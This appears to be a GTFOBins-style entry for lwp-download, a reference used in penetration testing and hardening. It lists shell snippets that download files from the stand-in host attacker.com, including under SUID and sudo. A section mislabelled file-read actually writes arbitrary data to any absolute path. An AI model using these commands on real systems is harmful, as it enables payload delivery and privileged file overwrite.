---
description: Fetch a remote file via HTTP GET request.
functions:
  file-download:
    - code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        lwp-download $URL $LFILE
  suid:
    - code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        ./lwp-download $URL $LFILE
  sudo:
    - code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        sudo lwp-download $URL $LFILE
  file-read:
    - description: The file path must be absolute.
      code: |
        echo "DATA-TO-WRITE" > /tmp/data
        INPUT=/tmp/data
        LFILE=file_to_write_absolute_path
        lwp-download file://$INPUT $LFILE
---
